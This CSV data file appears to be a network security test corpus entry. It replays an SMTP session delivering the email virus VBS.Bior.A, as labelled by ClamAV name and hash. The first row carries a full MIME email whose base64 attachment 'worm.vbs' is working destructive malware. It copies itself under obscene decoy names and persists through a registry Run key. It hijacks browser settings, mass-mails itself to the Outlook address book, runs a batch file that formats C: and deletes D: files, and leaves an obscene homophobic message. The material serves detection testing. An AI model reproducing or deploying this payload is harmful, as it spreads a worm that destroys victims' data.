XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,"Content-Transfer-Encoding: binary[[0A ]]Content-Type: multipart/mixed; boundary=""_----------=_113511247792480""[[0A ]]MIME-Version: 1.0[[0A ]]X-Mailer: MIME::Lite 3.01 (F2.73; A1.67; B3.05; Q3.03)[[0A ]]Date: Tue, 20 Dec 2005 21:01:17 UT[[0A ]]From: phar@example.com[[0A ]]To: victim@example.net[[0A ]]Subject: 'Curiouser and curiouser!' cried Alice.[[0A 0A ]]This is a multi-part message in MIME format.[[0A 0A ]]--_----------=_113511247792480[[0A ]]Content-Disposition: inline[[0A ]]Content-Length: 635[[0A ]]Content-Transfer-Encoding: binary[[0A ]]Content-Type: text/plain[[0A 0A ]]`But I don't want to go among mad people,' Alice remarked.[[0A ]]`Oh, you can't help that,' said the Cat: `we're all mad here. I'm mad.  You're mad.'[[0A ]]`How do you know I'm mad?' said Alice.[[0A ]]`You must be,' said the Cat, `or you wouldn't have come here.'[[0A ]]Alice didn't think that proved it at all; however, she went on` And how do you know that you're mad?'[[0A ]]`To begin with,' said the Cat, `a dog's not mad.  You grant that?'[[0A ]]`I suppose so,' said Alice.[[0A ]]`Well, then,' the Cat went on, `you see, a dog growls when it's angry, and wags its tail when it's pleased.  Now I growl when I'm pleased, and wag my tail [[0A ]]when I'm angry.  Therefore I'm mad.'[[0A ]]--_----------=_113511247792480[[0A ]]Content-Disposition: attachment; filename=""worm.vbs""[[0A ]]Content-Transfer-Encoding: base64[[0A ]]Content-Type: application/octet-stream; name=""worm.vbs""[[0A 0A ]]JyBWQlMuQmlnQm9zcy5Xb3JtDQoNClNldCBCb3NzPUNyZWF0ZU9iamVjdCgi[[0A ]]U2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQ0KQm9zcy5Db3B5RmlsZSBX[[0A ]]c2NyaXB0LlNjcmlwdEZ1bGxOYW1lLCAiQzpcTVkgSE9UIE5VREUgU0lTVEVS[[0A ]]ISEhIFhYWC5KUEcudmJzIg0KQm9zcy5Db3B5RmlsZSBXc2NyaXB0LlNjcmlw[[0A ]]dEZ1bGxOYW1lLCAiQzpcQU5OQUtPVVJOSUtPVkEgSU4gU0hPV0VSIEhPVCBY[[0A ]]WFguSlBHLnZicyINCkJvc3MuQ29weUZpbGUgV3NjcmlwdC5TY3JpcHRGdWxs[[0A ]]TmFtZSwgIkM6XEFNVVpJTkcgQVNTRlVDSyBGUkVFLkpQRy52YnMiDQpCb3Nz[[0A ]]LkNvcHlGaWxlIFdzY3JpcHQuU2NyaXB0RnVsbE5hbWUsICJDOlw1NiBZRUFS[[0A ]]IE9MRCBNQU4gRlVDS0lORyBURUVOUy5KUEcudmJzIg0KQm9zcy5Db3B5Rmls[[0A ]]ZSBXc2NyaXB0LlNjcmlwdEZ1bGxOYW1lLCAiQzpcV0lORE9XU1xUSUdIVCBQ[[0A ]]VVNTWSBTTElDSy5KUEcudmJzIg0KQm9zcy5Db3B5RmlsZSBXc2NyaXB0LlNj[[0A ]]cmlwdEZ1bGxOYW1lLCAiQzpcV0lORE9XU1xWRVJZIEJJRyBCT09CUyBQQU1F[[0A ]]TEEgLkpQRy52YnMiDQpCb3NzLkNvcHlGaWxlIFdzY3JpcHQuU2NyaXB0RnVs[[0A ]]bE5hbWUsICJDOlxXSU5ET1dTXEhPVCBURUVOIExFU0JJQU5TISEhIS5KUEcu[[0A ]]dmJzIg0KQm9zcy5Db3B5RmlsZSBXc2NyaXB0LlNjcmlwdEZ1bGxOYW1lLCAi[[0A ]]QzpcV0lORE9XU1xIVUdFICBJTiBNT1VUSC5KUEcudmJzIg0KQm9zcy5Db3B5[[0A ]]RmlsZSBXc2NyaXB0LlNjcmlwdEZ1bGxOYW1lLCAiQzpcV0lORE9XU1xTWVNU[[0A ]]RU1cQlJJVE5FWSBHRVQgRlVDS0VELkpQRy52YnMiDQpCb3NzLkNvcHlGaWxl[[0A ]]IFdzY3JpcHQuU2NyaXB0RnVsbE5hbWUsICJDOlxXSU5ET1dTXFNZU1RFTVxD[[0A ]]SFJJU1RJQU4gJiBLRVZJTiBCTE9XSk9CLkpQRy52YnMiDQpCb3NzLkNvcHlG[[0A ]]aWxlIFdzY3JpcHQuU2NyaXB0RnVsbE5hbWUsICJDOlxXSU5ET1dTXFNZU1RF[[0A ]]TVxESVJUWSBQVVNTWSAuSlBHLnZicyINCkJvc3MuQ29weUZpbGUgV3Njcmlw[[0A ]]dC5TY3JpcHRGdWxsTmFtZSwgIkM6XFdJTkRPV1NcU1lTVEVNXEFWUklMIExB[[0A ]]VklHTkUgUFVTU1lGVUNLLkpQRy52YnMiDQpCb3NzLkNvcHlGaWxlIFdzY3Jp[[0A ]]cHQuU2NyaXB0RnVsbE5hbWUsICJDOlxXSU5ET1dTXFNZU1RFTVxTWVNURU0z[[0A ]]Mi52YnMiDQoNClNldCBCb3NzID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNo[[0A ]]ZWxsIikNCkJvc3MuUmVnV3JpdGUgIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZU[[0A ]]V0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cQmln[[0A ]]Qm9zcyIsIkM6XFdJTkRPV1NcU1lTVEVNXFNZU1RFTTMyLnZicyINCkJvc3Mu[[0A ]]UmVnV3JpdGUgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29m[[0A ]]dFxJbnRlcm5ldCBFeHBsb3JlclxNYWluXEZ1bGxTY3JlZW4iLCJ5ZXMiDQpC[[0A ]]b3NzLlJlZ1dyaXRlICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNy[[0A ]]b3NvZnRcSW50ZXJuZXQgRXhwbG9yZXJcTWFpblxQbGF5X0FuaW1hdGlvbnMi[[0A ]]LCJubyINCkJvc3MuUmVnV3JpdGUgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3[[0A ]]YXJlXE1pY3Jvc29mdFxJbnRlcm5ldCBFeHBsb3JlclxNYWluXFByaW50X0Jh[[0A ]]Y2tncm91bmQiLCJ5ZXMiDQpCb3NzLlJlZ1dyaXRlICJIS0VZX0NVUlJFTlRf[[0A ]]VVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcSW50ZXJuZXQgRXhwbG9yZXJcTWFp[[0A ]]blxTZWFyY2ggUGFnZSIsImh0dHA6Ly93d3cuZ2F5LmNvbSINCkJvc3MuUmVn[[0A ]]V3JpdGUgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxJ[[0A ]]bnRlcm5ldCBFeHBsb3JlclxNYWluXFNob3dfU3RhdHVzQmFyIiwibm8iDQpC[[0A ]]b3NzLlJlZ1dyaXRlICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNy[[0A ]]b3NvZnRcSW50ZXJuZXQgRXhwbG9yZXJcTWFpblxTaG93X1Rvb2xCYXIiLCJu[[0A ]]byINCkJvc3MuUmVnV3JpdGUgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJl[[0A ]]XE1pY3Jvc29mdFxJbnRlcm5ldCBFeHBsb3JlclxNYWluXFNob3dfVVJMaW5T[[0A ]]dGF0dXNCYXIiLCJubyINCkJvc3MuUmVnV3JpdGUgIkhLRVlfQ1VSUkVOVF9V[[0A ]]U0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxJbnRlcm5ldCBFeHBsb3JlclxNYWlu[[0A ]]XFNob3dfVVJMVG9vbEJhciIsIm5vIg0KQm9zcy5SZWdXcml0ZSAiSEtFWV9D[[0A ]]VVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XEludGVybmV0IEV4cGxv[[0A ]]cmVyXE1haW5cU2hvd0dvQnV0dG9uIiwibm8iDQpCb3NzLlJlZ1dyaXRlICJI[[0A ]]S0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcSW50ZXJuZXQg[[0A ]]RXhwbG9yZXJcTWFpblxTdGFydCBQYWdlIiwiaHR0cDovL3d3dy5nYXkuY29t[[0A ]]DQpCb3NzLlJlZ1dyaXRlICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxN[[0A ]]aWNyb3NvZnRcSW50ZXJuZXQgRXhwbG9yZXJcVG9vbGJhclxMaW5rc0ZvbGRl[[0A ]]ck5hbWUiLCJGUkVFIEdBWVBPUk4iDQoNCkRpbSBCb3NzDQpTZXQgZnNvID0i[[0A ]]U2NyaXB0aW5nLkZpbGVTeXN0ZW0uT2JqZWN0Ig0KU2V0IHNvPUNyZWF0ZU9i[[0A ]]amVjdChmc28pDQpTZXQgb2w9Q3JlYXRlT2JqZWN0KCJPdXRsb29rLkFwcGxp[[0A ]]Y2F0aW9uIikNClNldCBvdXQ9V1NjcmlwdC5DcmVhdGVPYmplY3QoIk91dGxv[[0A ]]b2suQXBwbGljYXRpb24iKQ0KU2V0IG1hcGkgPSBvdXQuR2V0TmFtZVNwYWNl[[0A ]]KCJNQVBJIikNClNldCBhID0gbWFwaS5BZGRyZXNzTGlzdHMoMSkNCkZvciBC[[0A ]]b3NzPTEgVG8gYS5BZGRyZXNzRW50cmllcy5Db3VudA0KU2V0IE1haWw9b2wu[[0A ]]Q3JlYXRlSXRlbSgwKQ0KTWFpbC50bz1vbC5HZXROYW1lU3BhY2UoIk1BUEki[[0A ]]KS5BZGRyZXNzTGlzdHMoMSkuQWRkcmVzc0VudHJpZXMoQm9zcykNCk1haWwu[[0A ]]U3ViamVjdD0iICINCk1haWwuQm9keT0iICINCk1haWwuQXR0YWNobWVudHMu[[0A ]]QWRkIFdzY3JpcHQuU2NyaXB0RnVsbE5hbWUNCk1haWwuU2VuZA0Kb2wuUXVp[[0A ]]dA0KDQpEaW0geHh4LCBCb3NzLCBzaGVsbA0KU2V0IHh4eD1DcmVhdGVPYmpl[[0A ]]Y3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNClNldCBCb3NzPXh4[[0A ]]eC5DcmVhdGVUZXh0RmlsZSgiQzpcQmF0Qk9TUy5iYXQiKQ0KQm9zcy5Xcml0[[0A ]]ZUxpbmUgIkBFQ0hPIE9GRiINCkJvc3MuV3JpdGVMaW5lICJUSU1FIDg6MDAi[[0A ]]DQpCb3NzLldyaXRlTGluZSAiRk9STUFUIEM6ID4+IEM6XEFVVE9FWEVDLkJB[[0A ]]VCINCkJvc3MuV3JpdGVMaW5lICJERUwgRDpcKi4qIg0KQm9zcy5DbG9zZQ0K[[0A ]]c2hlbGwuUnVuICJDOlxCYXRCT1NTLmJhdCINCg0KRGltIGxvbCwgQm9zcywg[[0A ]]c2hlbGwNClNldCBsb2w9Q3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5[[0A ]]c3RlbU9iamVjdCIpDQpTZXQgQm9zcz1sb2wuQ3JlYXRlVGV4dEZpbGUoIkM6[[0A ]]XEJvc3NNZXNzYWdlLnR4dCIpDQpCb3NzLldyaXRlTGluZSAiICAgICINCkJv[[0A ]]c3MuV3JpdGVMaW5lICIgICAgIg0KQm9zcy5Xcml0ZUxpbmUgIiBGVUNLSU5H[[0A ]]IE1PVEhFUiBGVUNLRVIgIFlPVSEhIg0KQm9zcy5Xcml0ZUxpbmUgIiBIQUhB[[0A ]]SEEgRElFIEFTU0hPTEUgR0FZISINCkJvc3MuV3JpdGVMaW5lICIgICAgIg0K[[0A ]]Qm9zcy5Xcml0ZUxpbmUgIiAgICAiDQpCb3NzLldyaXRlTGluZSAiICAgICIN[[0A ]]CkJvc3MuV3JpdGVMaW5lICIgICAgIg0KQm9zcy5Xcml0ZUxpbmUgIiAgICAi[[0A ]]DQpCb3NzLldyaXRlTGluZSAiICAgICINCkJvc3MuV3JpdGVMaW5lICIgICAg[[0A ]]Ig0KQm9zcy5Xcml0ZUxpbmUgIlZCUy5CaWdCb3NzLldvcm0iDQpCb3NzLkNs[[0A ]]b3NlDQpzaGVsbC5SdW4gIkM6XEJvc3NNZXNzYWdlLnR4dCINCg0KDQotLS0N[[0A ]]Cg0KUGxlYXNlIHRlbGwgaWYgeW91IHNlZSBhbnkgZXJyb3JzLi4uICA=[[0A 0A ]]--_----------=_113511247792480--[[0A 0A 0A 0A]]"
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,[[0D 0A ]].[[0D 0A]]
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,QUIT[[0D 0A]]
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 [[4f 4b 0d 0a]]
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 Accepted[[0d 0a]]
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
VBS.Bior.A.f1aceb88.xml,Email Virus VBS.Bior.A,This is the email virus VBS.Bior.A as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: f1aceb880f05d75cf9904e562b80567a.  This attack is delivered via SMTP to a email server.,SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
